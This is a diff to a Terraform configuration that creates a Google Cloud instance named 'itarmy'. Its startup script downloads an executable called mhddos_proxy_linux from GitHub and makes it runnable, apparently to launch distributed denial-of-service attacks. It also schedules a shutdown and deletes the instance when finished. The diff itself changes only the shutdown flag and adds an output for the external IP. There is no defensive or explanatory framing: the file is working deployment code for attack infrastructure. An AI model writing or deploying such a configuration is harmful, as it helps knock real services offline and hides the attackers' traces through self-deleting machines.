@@ -62,7 +62,7 @@ resource "google_compute_instance" "itarmy" {
       #!/usr/bin/env bash
       apt update
       timedatectl set-timezone Europe/Kiev
-      shutdown -P 19:00 --no-wall
+      shutdown -h 19:00 --no-wall
       su - ubuntu << EOF
       mkdir -p ~/bin
       wget https://github.com/porthole-ascend-cinnamon/mhddos_proxy_releases/releases/latest/download/mhddos_proxy_linux -O ~/bin/mhddos_proxy_linux && chmod 755 ~/bin/mhddos_proxy_linux
@@ -78,4 +78,8 @@ resource "google_compute_instance" "itarmy" {
       gcloud compute instances delete $(hostname) --quiet --zone="$ZONE"
     EOT
   }
+}
+
+output "External_IP" {
+  value = google_compute_instance.itarmy.network_interface.0.access_config.0.nat_ip
 }
